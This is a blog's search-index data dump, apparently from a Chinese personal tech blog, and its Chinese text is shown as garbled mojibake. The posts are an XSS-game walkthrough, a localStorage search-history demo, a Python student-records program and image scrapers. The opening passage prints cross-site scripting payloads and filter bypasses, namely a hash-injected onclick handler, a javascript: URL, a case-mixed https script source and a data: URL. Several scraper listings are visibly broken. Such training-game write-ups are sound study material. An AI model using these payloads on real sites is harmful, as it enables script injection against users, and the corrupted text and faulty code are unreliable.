&quot;.jpg&#x27; /&gt;&quot;; $(&#x27;#tabContent&#x27;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(&#x27;.tab&#x27;); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123; tabs[i].className = &quot;tab active&quot;; &#125; else &#123; tabs[i].className = &quot;tab&quot;; &#125; &#125; // Tell parent we&#x27;ve changed the tab top.postMessage(self.location.toString(), &quot;*&quot;);&#125;window.onload = function() &#123; chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;);&#125;// Extra code so that we can communicate with the parent pagewindow.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; chooseTab(unescape(self.location.hash.substr(1))); &#125;&#125;, false); htmlä¸­å…³é”®ç‚¹ 1&lt;img src=&quot;/static/level3/cloud3.jpg&quot;&gt; åˆ†æ self.location.hash ï¼šè·å–URL#å·åé¢çš„å†…å®¹ unescape()ï¼šä¸ç”¨urlè§£ç  chooseTab()ï¼šå°†#åé¢è¾“å…¥çš„å›¾ç‰‡ç¼–ç åŠ å…¥imgæ ‡ç­¾ä¸­ æ¸…æ™°äº†åˆ©ç”¨ç‚¹ï¼Œå°±æ˜¯#åé¢çš„å†…å®¹ä¼šè¢«æ‹¼æ¥åˆ°htmlä¸­ 1https://xss-game.appspot.com/level3/frame#3&#x27; onclick=&#x27;alert(1)&#x27;; 04è¾“å…¥çš„ä¸œè¥¿ä¼šæ‹¼æ¥åˆ°è¿™é‡Œ payload 1&#x27;);alert(1);var x=(&#x27; 05nextå¯æ§ 12åœ¨urlä¸Šè¾“å…¥ï¼šnext=javascript:alert(1) 06urlé‡Œ#åé¢çš„å†…å®¹ä¼šæ‹¼æ¥åˆ°scriptæ ‡ç­¾çš„srcä¸­ï¼Œä½†æ˜¯è¿‡æ»¤äº†httpï¼Œè€Œä¸”å¿…é¡»ä½¿ç”¨httpsåè®® å¤§å°å†™ç»•è¿‡ ä¸€ç§è§£æ³•è¿œç¨‹åŠ è½½jsä»£ç  googleAPI 1htTps://www.google.com/jsapi?callback=alert ç¬¬äºŒç§è§£æ³•ï¼šdata:text,alert(1)","categories":[],"tags":[]},{"title":"JavaScriptå®ç°webæµè§ˆå™¨æœ¬åœ°å­˜å‚¨","slug":"JavaScriptæœ¬åœ°å­˜å‚¨","date":"2018-12-17T16:00:00.000Z","updated":"2021-10-22T08:30:46.661Z","comments":true,"path":"2018/12/18/JavaScriptæœ¬åœ°å­˜å‚¨/","link":"","permalink":"http://example.com/2018/12/18/JavaScript%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/","excerpt":"å±±å±±å¸ˆå‚…å‡ºçš„ç¬¬ä¸€ä¸ªå°ä»»åŠ¡ï¼Œç”¨JavaScriptå®ç°webæµè§ˆå™¨çš„æœ¬åœ°å­˜å‚¨ï¼šæ¨¡æ‹Ÿç™¾åº¦æœç´¢å†å²è®°å½•ï¼Œå°†æœç´¢è¿‡çš„å†…å®¹ç”¨æœ¬åœ°å­˜å‚¨ä¿å­˜å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚è¿™æ˜¯ä¸€ç¯‡å°ç™½æ°´æ–‡ã€‚","text":"å±±å±±å¸ˆå‚…å‡ºçš„ç¬¬ä¸€ä¸ªå°ä»»åŠ¡ï¼Œç”¨JavaScriptå®ç°webæµè§ˆå™¨çš„æœ¬åœ°å­˜å‚¨ï¼šæ¨¡æ‹Ÿç™¾åº¦æœç´¢å†å²è®°å½•ï¼Œå°†æœç´¢è¿‡çš„å†…å®¹ç”¨æœ¬åœ°å­˜å‚¨ä¿å­˜å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚è¿™æ˜¯ä¸€ç¯‡å°ç™½æ°´æ–‡ã€‚ localstoragelocalstorageçš„ä¸»è¦å‡½æ•°æœ‰ localstorage.setItem(â€˜å±æ€§åâ€™,â€™å±æ€§å€¼â€™) : å­˜å…¥lo localstorage.getItem(â€˜å±æ€§åâ€™)ï¼šè¯»å– localstorage.clear()ï¼šåˆ é™¤ æœ¬æ¬¡å­˜å…¥çš„æ•°æ®ä½¿ç”¨æ•°ç»„æ–¹å¼å­˜å…¥ï¼Œä½†æ˜¯localstorageçš„å­˜å‚¨ä¸æ”¯æŒæ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥è¦ç”¨åˆ°JSONçš„ä¸¤ä¸ªå‡½æ•°JSON.stringify()å’ŒJSON.parse()ï¼Œåœ¨å­˜æ•°æ®æ—¶å°†æ•°ç»„åºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œå–å‡ºæ•°æ®æ—¶å°†æ•°æ®åºåˆ—åŒ–æˆå¯¹è±¡ï¼Œç„¶åå†å°†å¯¹è±¡è½¬åŒ–ä¸ºæ•°ç»„ï¼Œä¾¿äºæ¯”è¾ƒå’Œå»é‡ã€‚ä¸‹é¢ä¸¤å¼ å›¾æ¥å±•ç°ä¸€ä¸‹è¿™å‡ ä¸ªå‡½æ•°çš„ç”¨æ³• PSï¼šæ­¤å¤„æ’æ’­ä¸€ä¸ªé‡åˆ°çš„å°å°é—®é¢˜ï¼Œå°±æ˜¯ä¹‹å‰æµ‹è¯•æ—¶å­˜å…¥æ•°æ®å¦‚æœæ²¡æœ‰ç”¨JSON.stringify()å°†æ•°æ®è½¬æ¢æˆç›¸åº”çš„JSON æ ¼å¼çš„è¯ï¼Œé‚£åé¢å¦‚æœæƒ³ç”¨JSON.parse()è¯»å–æ•°æ®æ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸ºå­˜å…¥çš„æ•°æ®ä¸æ˜¯JSONæ ¼å¼çš„ï¼Œæ‰€ä»¥è§£æçš„æ—¶å€™ä¼šæŠ¥é”™ã€‚ JSä»£ç å­˜å‚¨123456789101112131415161718192021222324252627282930313233343536373839404142function saveHistory()&#123; mySearch = document.getElementById(&#x27;search_content&#x27;).value; var searchs = []; var storagesearchs = JSON.parse(localStorage.getItem(&#x27;searchs&#x27;)); for (let i in storagesearchs)&#123; searchs.push(storagesearchs[i]); &#125; if (searchs === undefined || searchs.length == 0)&#123; searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; else&#123; flag = 1; if (searchs.length &lt;= 8)&#123; //å»é‡ for(let i in searchs)&#123; if(searchs[i] === mySearch)&#123; flag = 0; &#125; &#125; if(flag)&#123; if(searchs.length == 8)&#123; searchs.splice(0,1); searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; else&#123; searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; &#125; &#125; &#125; location.reload();//å‡½æ•°æ‰§è¡Œååˆ·æ–°ä¸€æ¬¡é¡µé¢&#125; å–å‡º12345678910111213141516171819function showHistory() &#123;// alert(&#x27;show&#x27;); var searchs = []; var storagesearchs = JSON.parse(localStorage.getItem(&#x27;searchs&#x27;)); for (let i in storagesearchs)&#123; searchs.push(storagesearchs[i]); &#125; var len = searchs.length; var ul = document.getElementById(&#x27;search_list&#x27;); for (var i=0; i&lt;len; i++)&#123; var div = document.createElement(&#x27;div&#x27;); var li = document.createElement(&#x27;li&#x27;);//åˆ›å»ºä¸€ä¸ªliå…ƒç´  li.innerHTML = searchs[i];//å°†æœç´¢è®°å½•å†™å…¥liä¸­ ul.appendChild(li)//åœ¨ulæ ‡ç­¾ä¸‹è¿½åŠ liå…ƒç´  &#125; &#125; htmlä»£ç 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;ç™¾åº¦æœç´¢&lt;/title&gt; &lt;link href=&quot;https://fonts.googleapis.com/css?family=PT+Sans&quot; rel=&quot;stylesheet&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/style.css&quot;&gt; &lt;script src=&quot;scripts/main.js&quot; async&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;searching&quot;&gt; &lt;span&gt; &lt;input type=&quot;text&quot; name = &quot;search&quot; id = &quot;search_content&quot; autocomplete=&quot;off&quot; placeholder=&quot;è¯·è¾“å…¥æœç´¢å†…å®¹Â·Â·Â·Â·Â·Â·Â·&quot;&gt; &lt;ul id=&quot;search_list&quot;&gt; &lt;/ul&gt; &lt;/span&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; value=&quot;æœç´¢&quot; id = &#x27;clicking&#x27;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; å°ç»“è¿™æ¬¡çš„task1å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œlocalstorageï¼Œå¯¹jså‡½æ•°ä¹Ÿæœ‰äº†æ›´æ·±çš„è®¤è¯†ï¼Œè¿˜æœ‰htmlï¼Œcssä¹Ÿå­¦åˆ°äº†å¾ˆå¤šï¼Œå¼€å¿ƒï¼ï¼é‡æ‹¾ä»£ç ä¹è¶£ï¼ï¼","categories":[],"tags":[]},{"title":"å­¦ç”Ÿä¿¡æ¯ç®¡ç†ç³»ç»Ÿ - python","slug":"student- manage","date":"2018-06-29T16:00:00.000Z","updated":"2021-10-22T08:31:22.564Z","comments":true,"path":"2018/06/30/student- manage/","link":"","permalink":"http://example.com/2018/06/30/student-%20manage/","excerpt":"æœ€è¿‘å­¦ä¹ pythonï¼Œå°±å†™äº†ä¸€ä¸ªå­¦ç”Ÿç®¡ç†ç³»ç»Ÿã€‚","text":"æœ€è¿‘å­¦ä¹ pythonï¼Œå°±å†™äº†ä¸€ä¸ªå­¦ç”Ÿç®¡ç†ç³»ç»Ÿã€‚ ä»‹ç»ä¸»è¦åŠŸèƒ½ï¼š æ·»åŠ ä¿¡æ¯ ä¿®æ”¹ä¿¡æ¯ åˆ é™¤ä¿¡æ¯ æŸ¥æ‰¾ æ˜¾ç¤ºæ‰€æœ‰ æ•°æ®å­˜å–æ–¹å¼ï¼šä½¿ç”¨jsonæ–‡ä»¶å­˜å– ç¯å¢ƒï¼šWindows python3 ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import jsonstuinfos = []def printMenu(): print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27;\\n&#x27;) print(&#x27; &#x27;*25 + &#x27;1.æ·»åŠ å­¦ç”Ÿä¿¡æ¯&#x27;) print(&#x27; &#x27;*25 + &#x27;2.ä¿®æ”¹å­¦ç”Ÿä¿¡æ¯&#x27;) print(&#x27; &#x27;*25 + &#x27;3.åˆ é™¤å­¦ç”Ÿä¿¡æ¯&#x27;) print(&#x27; &#x27;*25 + &#x27;4.æŸ¥æ‰¾å­¦ç”Ÿä¿¡æ¯&#x27;) print(&#x27; &#x27;*25 + &#x27;5.æ˜¾ç¤ºæ‰€æœ‰å­¦ç”Ÿä¿¡æ¯&#x27;) print(&#x27; &#x27;*25 + &#x27;0.é€€å‡ºç³»ç»Ÿ&#x27;) print(&#x27;\\n&#x27;) print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27;\\n&#x27;)def addStuinfo(): print(&#x27; &#x27;*20+&#x27;=&#x27;*40) newName = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥å­¦ç”Ÿå§“åï¼š&#x27;) newSex = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥å­¦ç”Ÿæ€§åˆ«ï¼š&#x27;) newPhone = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥å­¦ç”Ÿæ‰‹æœºå·ç ï¼š&#x27;) print(&#x27; &#x27;*20+&#x27;=&#x27;*40) stuinfo = &#123;&#125; #å£°æ˜ä¸€ä¸ªå­—å…¸æ¥å­˜æ”¾æ–°å­¦ç”Ÿçš„ä¿¡æ¯ stuinfo[&#x27;name&#x27;] = newName stuinfo[&#x27;sex&#x27;] = newSex stuinfo[&#x27;phone&#x27;] = newPhone #stuinfos.append(stuinfo) save_newData(stuinfo)def modifyStuinfo(): number = int(input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥è¦ä¿®æ”¹çš„å­¦ç”Ÿåºå·ï¼š&#x27;)) modify_key = int(input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥æƒ³ä¿®æ”¹çš„ä¿¡æ¯ï¼ˆ1.å§“å 2.æ€§åˆ« 3.æ‰‹æœºå·ç ï¼‰&#x27;)) if modify_key == 1: newName = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥ä¿®æ”¹çš„å§“åï¼š&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;name&#x27;] = newName save_Data(stuinfos) elif modify_key == 2: newSex = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥ä¿®æ”¹çš„æ€§åˆ«ï¼ˆç”·/å¥³ï¼‰ï¼š&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;sex&#x27;] = newSex save_Data(stuinfos) elif modify_key == 3: newPhone = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥ä¿®æ”¹çš„æ‰‹æœºå·ç ï¼š&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;phone&#x27;] = newPhone save_Data(stuinfos) #showStuinfos()def deleteStuinfos(): number = int(input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥æƒ³è¦åˆ é™¤çš„å­¦ç”Ÿåºå·ï¼š&#x27;)) stuinfos = load_data() del stuinfos[number-1] save_Data(stuinfos) showStuinfos()def findStuinfo(): stuinfos = load_data() lenth = len(stuinfos) find_key = int(input(&#x27; &#x27;*20+&#x27;é€‰æ‹©æŸ¥æ‰¾æ–¹å¼åºå·ï¼ˆ1.åºå·æŸ¥æ‰¾(1-%d) 2.å§“åæŸ¥æ‰¾ï¼‰ï¼š&#x27;%lenth)) flag = 0 if find_key == 1: number = int(input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥æƒ³è¦æŸ¥æ‰¾çš„åºå·&#x27;)) if number &gt; lenth: print(&#x27; &#x27;*20+&#x27;Error,the number is big than the total!&#x27;) else: print(&#x27; &#x27;*20+&#x27;åºå· å§“å æ€§åˆ« ç”µè¯å·ç &#x27;) print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(number,stuinfos[number-1][&#x27;name&#x27;],stuinfos[number-1][&#x27;sex&#x27;],stuinfos[number-1][&#x27;phone&#x27;])) else : find_name = input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥éœ€è¦æŸ¥æ‰¾çš„å§“å&#x27;) i = 1 for stuinfo in stuinfos: if stuinfo[&#x27;name&#x27;] == find_name: flag = 1 print(&#x27; &#x27;*20+&#x27;åºå· å§“å æ€§åˆ« ç”µè¯å·ç &#x27;) print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(i,stuinfo[&#x27;name&#x27;],stuinfo[&#x27;sex&#x27;],stuinfo[&#x27;phone&#x27;])) break i += 1 if flag == 0: print(&#x27; &#x27;*20+&#x27;Not Found&#x27;)def showStuinfos(): i = 1 stuinfos = load_data() print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27; &#x27;*20+&#x27;åºå· å§“å æ€§åˆ« ç”µè¯å·ç &#x27;) for stuinfo in stuinfos: print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(i,stuinfo[&#x27;name&#x27;],stuinfo[&#x27;sex&#x27;],stuinfo[&#x27;phone&#x27;])) i += 1 print(&#x27; &#x27;*20+&#x27;=&#x27;*40)def save_Data(dicts): with open(&#x27;test.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fw: for dict in dicts: json.dump(dict,fw,ensure_ascii=False) fw.write(&#x27;\\n&#x27;) fw.close()def save_newData(dict): with open(&#x27;test.json&#x27;,&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;) as fwr: json.dump(dict,fwr,ensure_ascii=False) fwr.write(&#x27;\\n&#x27;) fwr.close()def load_data(): data = [] with open(&quot;test.json&quot;, &quot;r&quot;,encoding = &#x27;utf-8&#x27;) as fr: for line in fr: dic = json.loads(line) data.append(dic) fr.close() return datadef main(): while 1: printMenu() key = int(input(&#x27; &#x27;*20+&#x27;è¯·è¾“å…¥éœ€è¦è¿›è¡Œçš„æ“ä½œï¼š&#x27;)) if key == 1: addStuinfo() elif key == 2: modifyStuinfo() elif key == 3: deleteStuinfos() elif key == 4: findStuinfo() elif key == 5: showStuinfos() elif key == 0: exit()main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"pythonçˆ¬è™«-å•&å¤šçº¿ç¨‹","slug":"pythonå•&å¤šçº¿ç¨‹","date":"2018-05-02T16:00:00.000Z","updated":"2021-10-22T08:25:12.052Z","comments":true,"path":"2018/05/03/pythonå•&å¤šçº¿ç¨‹/","link":"","permalink":"http://example.com/2018/05/03/python%E5%8D%95&%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"ä»¥æŠ“å–https://www.pexels.com/ç½‘ç«™å›¾ç‰‡ä¸ºä¾‹ å‰ç½®åŸºç¡€ï¼šäº†è§£HTMLçš„DOMè§£æç»“æ„","text":"ä»¥æŠ“å–https://www.pexels.com/ç½‘ç«™å›¾ç‰‡ä¸ºä¾‹ å‰ç½®åŸºç¡€ï¼šäº†è§£HTMLçš„DOMè§£æç»“æ„ å•çº¿ç¨‹è·å–ç½‘é¡µhtml123456789101112131415from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)html=page.read()print(html)with open(&#x27;test.html&#x27;,&#x27;wb&#x27;) as f: f.write(html) f.close() è·å–å›¾ç‰‡imgæ ‡ç­¾1234567891011121314from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;) #æŸ¥æ‰¾classä¸ºphoto-item__imgçš„imgæ ‡ç­¾for src in srcs: print(src) æˆªå–imgæ ‡ç­¾ä¸­çš„å›¾ç‰‡urlé“¾æ¥123456789101112131415from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)for src in srcs: links = src.get(&#x27;src&#x27;) print(links) å°†å»æ‰å¤šä½™å‚æ•°1234567891011121314151617181920from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)for sr in srcs: links = sr.get(&#x27;src&#x27;) first_pos = links.index(&#x27;?&#x27;) last_pos = links.index(&#x27;500&#x27;) split = links[first_pos : last_pos+3] links_final = links.replace(split,&#x27;&#x27;) print(links_final) å†™å…¥æœ¬åœ°12345678910111213141516171819202122232425262728293031from urllib import requestfrom bs4 import BeautifulSoupimport reimport osimport codecsheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)x=1for sr in srcs: url = sr.get(&#x27;src&#x27;) first_pos = links.index(&#x27;?&#x27;) last_pos = links.index(&#x27;5&#x27;) split = links[first_pos : last_pos+3] url = links.replace(split,&#x27; &#x27;) path = r&#x27;D:\\\\img\\\\&#x27; if &#x27;https&#x27; in url: url1 = request.Request(url,headers = headers) url = request.urlopen(url1) f = codecs.open(path+&#x27;%s.jpg&#x27;%(x), &#x27;wb&#x27;) x+=1 f.write(url.read()) f.close() æœ€ç»ˆç‰ˆæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import osfrom bs4 import BeautifulSoupfrom urllib import requestdef cut_url(link):#åœ¨imgæ ‡ç­¾ä¸­è·å–åˆ°å›¾ç‰‡çš„urlï¼Œå¹¶å»æ‰å¤šä½™çš„å‚æ•° link = link.get(&#x27;src&#x27;)#è·å–imgæ ‡ç­¾ä¸­çš„å›¾ç‰‡url first_pos = link.index(&#x27;?&#x27;) last_pos = link.index(&#x27;5&#x27;) split = link[first_pos : last_pos+3]#æˆªå–å¤šä½™çš„å‚æ•° url = link.replace(split,&#x27;&#x27;)#ç”¨replaceå‡½æ•°å°†å¤šä½™çš„å‚æ•°å»æ‰ return urldef save_img(url,x):#ä¿å­˜å›¾ç‰‡ if &#x27;https&#x27; in url: url = request.Request(url,headers = headers) file = request.urlopen(url).read() path = &#x27;./img&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+&#x27;%s.jpg&#x27;%x,&#x27;wb&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+&#x27;%s.jpg&#x27;%x,&#x27;wb&#x27;) as f: f.write(file) f.close() flag = 1 else: flag = 0 if flag: return 1 else: return flag,urlheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;res = request.Request(url,headers = headers)res = request.urlopen(res)soup = BeautifulSoup(res,&#x27;lxml&#x27;)links = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)x = 1for link in links: url = cut_url(link) flag = save_img(url,x) x += 1 if flag: print(flag) else: print(&#x27;bad&#x27;+flag) å¤šçº¿ç¨‹å¤šçº¿ç¨‹çˆ¬è™«ï¼Œåˆ†åˆ«ç”¨threadpool()å’ŒThreadPoolExexutor()æ¨¡å—å®ç°ã€‚ threadpoolæ¨¡å—æ ¸å¿ƒä»£ç  12345pool = threadpool.ThreadPool(x)#å£°æ˜ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œxè¡¨ç¤ºéœ€è¦çº¿ç¨‹æ•° requests = threadpool.makeRequests(function_name,å‚æ•°) for req in requests: pool.putRequest(req) pool.wait()#ç­‰å¾…æ‰€æœ‰å­çº¿ç¨‹éƒ½æ‰§è¡Œå®Œæ¯•åå†æ‰§è¡Œä¸»çº¿ç¨‹ä¸‹é¢çš„è¯­å¥ï¼Œå¦åˆ™ä¼šç›´æ¥è¿è¡Œä¸»çº¿ç¨‹ è¿™æ˜¯å£°æ˜ä¸€ä¸ªçº¿ç¨‹æ± æ¥å°†æ‰€æœ‰çš„çº¿ç¨‹å†åˆ©ç”¨forå¾ªç¯ä¸€èµ·å¯åŠ¨ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåå¤„å°±æ˜¯å½“çº¿ç¨‹å¤šçš„æ—¶å€™å°±ç‰¹åˆ«å®¹æ˜“å‘ç”Ÿå µå¡ï¼Œé€‚ç”¨äºçº¿ç¨‹è¾ƒå°‘çš„æ—¶å€™ threadpoolæ¨¡å—çš„çˆ¬è™«ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import threadingimport threadpoolfrom bs4 import BeautifulSoupfrom urllib import requestimport osdef thread_run(thread): thread.start() thread.join()def save_img(url,name): print(&#x27;tread %s is start &#x27;%threading.current_thread().name) flag = 0 headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; url = request.Request(url,headers = headers) html = request.urlopen(url) file = html.read() path = &#x27;./wallroom2&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+name,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+url,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 if flag == 1: print(&#x27;the %s is ok&#x27;%name) else: print(&#x27;the %s is fail&#x27;%url)def get_url(url): headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; res = request.Request(url,headers = headers) html = request.urlopen(res).read() soup = BeautifulSoup(html,&#x27;lxml&#x27;) links = soup.find_all(&#x27;a&#x27;) return linksdef set_name(url): pos = url.index(&#x27;bg-&#x27;) name = url[pos:pos+10] + &#x27;.jpeg&#x27; print(name) return namedef main(): url = input(&#x27;è¯·è¾“å…¥wallroomçš„ä¸€ä¸ªç½‘å€ï¼š&#x27;) tread_list = [] links = get_url(url) x = 0 for link in links: url1 = link.get(&#x27;href&#x27;) print(url1) if url1.find(&#x27;bg&#x27;) &gt; 0: x += 1 url_real = &#x27;https://wallroom.io&#x27; + url1 +&#x27;/download&#x27; print(url_real) name = set_name(url1) thread_name = name thread_name = threading.Thread(target=save_img,args = (url_real,name,)) names.append(name) urls.append(url_real) tread_list.append(thread_name) #for tread_list in range(10): pool = threadpool.ThreadPool(x) requests = threadpool.makeRequests(thread_run, tread_list) for req in requests: pool.putRequest(req) pool.wait() print(&#x27;ok&#x27;)main() ThreadPoolExecutoræ¨¡å—ThreadPoolExecutorå°±æä¾›äº†ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥è§„å®šåœ¨è¿›ç¨‹æ± é‡Œå¯ä»¥æœ‰å¤šå°‘çº¿ç¨‹åœ¨è¿è¡Œï¼Œåœ¨çº¿ç¨‹æ¯”è¾ƒå¤šçš„æ—¶å€™å‡å°‘äº†èµ„æºçš„å ç”¨ æ ¸å¿ƒä»£ç  123executor = ThreadPoolExecutor(x)#çº¿ç¨‹æ± ä¸­èƒ½å¤Ÿè¿›è¡Œçš„çº¿ç¨‹åªèƒ½æœ‰xä¸ª all_task = [executor.submit(save_img, (url)) for url in urls] wait(all_task, return_when=ALL_COMPLETED)#ç›¸å½“äºthreadpoolä¸­çš„wait() åˆ©ç”¨ThreadPoolExecutorçˆ¬è™«çš„å®Œæ•´ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import threadpoolimport threadingfrom bs4 import BeautifulSoupfrom urllib import requestimport osfrom concurrent.futures import ThreadPoolExecutor , wait, ALL_COMPLETED, FIRST_COMPLETEDdef save_img(url): print(&#x27;tread %s is start &#x27;%threading.current_thread().name) name = set_name(url) flag = 0 headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; url = request.Request(url,headers = headers) html = request.urlopen(url) file = html.read() path = &#x27;./wallroom2880&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+name,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+url,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 if flag: print(&#x27;the %s is ok&#x27;%name) else: print(&#x27;the %s is fail&#x27;%url)def get_url(url): headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; res = request.Request(url,headers = headers) html = request.urlopen(res).read() soup = BeautifulSoup(html,&#x27;lxml&#x27;) links = soup.find_all(&#x27;a&#x27;) return linksdef set_name(url): pos = url.index(&#x27;bg-&#x27;) name = url[pos:pos+10] + &#x27;.jpeg&#x27; return namedef main(): url = input(&#x27;è¯·è¾“å…¥wallroomçš„ä¸€ä¸ªç½‘å€ï¼š&#x27;) urls = [] links = get_url(url) #print(links) for link in links: url1 = link.get(&#x27;href&#x27;) #print(url1) if url1.find(&#x27;bg&#x27;) &gt; 0: url_real = &#x27;https://wallroom.io&#x27; + url1 +&#x27;/download&#x27; print(url_real) urls.append(url_real) executor = ThreadPoolExecutor(10) all_task = [executor.submit(save_img, (url)) for url in urls] wait(all_task, return_when=ALL_COMPLETED) 